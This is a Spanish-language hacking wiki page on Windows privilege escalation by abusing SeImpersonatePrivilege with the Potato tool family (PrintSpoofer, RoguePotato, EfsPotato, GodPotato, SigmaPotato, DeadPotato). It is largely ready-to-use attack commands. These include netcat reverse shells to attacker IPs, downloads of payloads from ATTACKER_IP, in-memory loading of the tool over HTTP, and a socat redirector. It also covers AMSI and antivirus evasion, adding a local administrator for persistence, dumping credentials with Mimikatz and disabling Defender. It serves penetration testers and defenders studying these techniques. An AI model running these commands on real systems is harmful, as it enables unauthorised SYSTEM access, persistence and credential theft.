# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato no funciona** en Windows Server 2019 y Windows 10 build 1809 y posteriores. Sin embargo, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**,** se pueden utilizar para **aprovechar los mismos privilegios y obtener** acceso de nivel `NT AUTHORITY\SYSTEM`. Esta [publicación del blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) explica detalladamente la herramienta `PrintSpoofer`, que se puede utilizar para abusar de los privilegios de suplantación en hosts Windows 10 y Server 2019 donde JuicyPotato ya no funciona.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Una alternativa moderna que se mantiene con frecuencia en 2024–2025 es SigmaPotato (un fork de GodPotato), que añade el uso de reflexión en memoria/.NET y compatibilidad ampliada con sistemas operativos. Consulta el uso rápido a continuación y el repositorio en References.

Páginas relacionadas para obtener contexto y consultar técnicas manuales:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisitos y problemas habituales

Todas las técnicas siguientes dependen del abuso de un servicio privilegiado con capacidad de suplantación desde un contexto que tenga uno de estos privilegios:

- SeImpersonatePrivilege (el más común) o SeAssignPrimaryTokenPrivilege
- No se requiere una integridad alta si el token ya tiene SeImpersonatePrivilege (lo habitual en muchas cuentas de servicio, como IIS AppPool, MSSQL, etc.)

Comprobar rápidamente los privilegios:
```cmd
whoami /priv | findstr /i impersonate
```
Notas operativas:

- Si tu shell se ejecuta bajo un token restringido que carece de SeImpersonatePrivilege (común para Local Service/Network Service en algunos contextos), recupera los privilegios predeterminados de la cuenta usando FullPowers y, después, ejecuta un Potato. Ejemplo: `FullPowers.exe -c "cmd /c whoami /priv" -z`<sup>[[10]](#references)[[11]](#references)</sup>
- PrintSpoofer necesita que el servicio Print Spooler esté en ejecución y sea accesible mediante el endpoint RPC local (spoolss). En entornos reforzados donde Spooler está deshabilitado después de PrintNightmare, es preferible usar RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato requiere un OXID resolver accesible en TCP/135. Si la salida está bloqueada, usa un redirector/port-forwarder (consulta el ejemplo siguiente). Las versiones antiguas necesitaban el flag -f.
- EfsPotato/SharpEfsPotato abusan de MS-EFSR; si un pipe está bloqueado, prueba pipes alternativos (lsarpc, efsrpc, samr, lsass, netlogon).
- El error 0x6d3 durante RpcBindingSetAuthInfo normalmente indica un servicio de autenticación RPC desconocido o no compatible; prueba un pipe/transport alternativo o asegúrate de que el servicio de destino esté en ejecución.
- Los forks “Kitchen-sink”, como DeadPotato, incluyen módulos de payload adicionales (Mimikatz/SharpHound/Defender off) que escriben en disco; espera una detección de EDR mayor en comparación con los originales más ligeros.

## Demostración rápida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notas:
- Puedes usar `-i` para iniciar un proceso interactivo en la consola actual, o `-c` para ejecutar un one-liner.
- Requiere el servicio Spooler. Si está deshabilitado, fallará.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Si el puerto 135 saliente está bloqueado, haz pivot del OXID resolver mediante socat en tu redirector:<sup>[[9]](#references)</sup>
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato es una primitiva más reciente de abuso de COM, publicada a finales de 2022, que ataca el servicio **PrintNotify** en lugar de Spooler/BITS. El binario instancia el servidor COM de PrintNotify, sustituye un `IUnknown` falso y, a continuación, activa un callback privilegiado mediante `CreatePointerMoniker`. Cuando el servicio PrintNotify (que se ejecuta como **SYSTEM**) se conecta de vuelta, el proceso duplica el token devuelto y ejecuta el payload proporcionado con privilegios completos.<sup>[[13]](#references)</sup>

Notas operativas clave:

* Funciona en Windows 10/11 y Windows Server 2012–2022, siempre que el servicio Print Workflow/PrintNotify esté instalado (está presente incluso cuando el Spooler heredado está deshabilitado tras PrintNightmare).
* Requiere que el contexto de llamada tenga el privilegio `SeImpersonatePrivilege` (habitual en IIS APPPOOL, MSSQL y cuentas de servicio de tareas programadas).
* Acepta tanto un comando directo como un modo interactivo, lo que permite permanecer dentro de la consola original. Ejemplo:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Al estar basado exclusivamente en COM, no requiere listeners de named pipes ni redirectors externos, por lo que funciona como reemplazo directo en hosts donde Defender bloquea el RPC binding de RoguePotato.

Actores como Ink Dragon ejecutan PrintNotifyPotato inmediatamente después de obtener RCE mediante ViewState en SharePoint para pasar del worker `w3wp.exe` a SYSTEM antes de instalar ShadowPad.<sup>[[14]](#references)</sup>

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Consejo: Si un pipe falla o EDR lo bloquea, prueba los otros pipes compatibles:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notas:
- Funciona en Windows 8/8.1–11 y Server 2012–2022 cuando SeImpersonatePrivilege está presente.
- Obtén el binario que coincida con el runtime instalado (por ejemplo, `GodPotato-NET4.exe` en Server 2022 moderno).
- Si tu primitiva de ejecución inicial es un webshell/UI con timeouts cortos, prepara el payload como un script y pide a GodPotato que lo ejecute en lugar de usar un comando inline largo.<sup>[[12]](#references)</sup>

Patrón rápido de preparación desde un webroot de IIS con permisos de escritura:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato proporciona dos variantes dirigidas a objetos DCOM de servicios que usan de forma predeterminada RPC_C_IMP_LEVEL_IMPERSONATE. Compila o utiliza los binarios proporcionados y ejecuta tu comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (updated GodPotato fork)

SigmaPotato añade mejoras modernas, como la ejecución en memoria mediante reflexión de .NET y un helper de reverse shell de PowerShell.<sup>[[8]](#references)</sup>
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Ventajas adicionales en builds de 2024–2025 (v1.2.x):
- Flag integrado de reverse shell `--revshell` y eliminación del límite de 1024 caracteres de PowerShell, para poder ejecutar payloads largos que evaden AMSI de una sola vez.
- Sintaxis compatible con Reflection (`[SigmaPotato]::Main()`), además de un rudimentario truco de evasión de AV mediante `VirtualAllocExNuma()` para confundir heurísticas simples.
- `SigmaPotatoCore.exe` independiente, compilado para .NET 2.0 para entornos con PowerShell Core.

### DeadPotato (rework de GodPotato de 2024 con módulos)

DeadPotato mantiene la cadena de impersonation OXID/DCOM de GodPotato, pero incorpora helpers de post-exploitation para que los operadores puedan obtener SYSTEM inmediatamente y realizar persistence/collection sin herramientas adicionales.<sup>[[15]](#references)</sup>

Módulos comunes (todos requieren SeImpersonatePrivilege):

- `-cmd "<cmd>"` — ejecutar un command arbitrario como SYSTEM.
- `-rev <ip:port>` — reverse shell rápido.
- `-newadmin user:pass` — crear un administrador local para persistence.
- `-mimi sam|lsa|all` — soltar y ejecutar Mimikatz para volcar credenciales (toca el disco y es ruidoso).
- `-sharphound` — ejecutar la collection de SharpHound como SYSTEM.
- `-defender off` — desactivar la protección en tiempo real de Defender (muy ruidoso).

Ejemplos de one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Como incluye binarios adicionales, espera más alertas de AV/EDR; usa el GodPotato/SigmaPotato más ligero cuando el stealth sea importante.

## Referencias

- [1] [PrintSpoofer – Abuso de privilegios de suplantación en Windows 10 y Server 2019](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [2] [itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [3] [antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [4] [bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [5] [BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [6] [zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [7] [zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [8] [tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [9] [¿Se acabó JuicyPotato? Una vieja historia, bienvenido RoguePotato](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [10] [FullPowers – Restaurar los privilegios predeterminados de los tokens para cuentas de servicio](https://github.com/itm4n/FullPowers)
- [11] [HTB: Media — leak de NTLM de WMP → junction de NTFS al webroot para RCE → FullPowers + GodPotato para obtener SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [12] [HTB: Job — macro de LibreOffice → webshell de IIS → GodPotato para obtener SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [13] [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [14] [Check Point Research – Dentro de Ink Dragon: revelando la red de relay y el funcionamiento interno de una operación ofensiva sigilosa](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [15] [DeadPotato – Reimplementación de GodPotato con módulos post-ex integrados](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
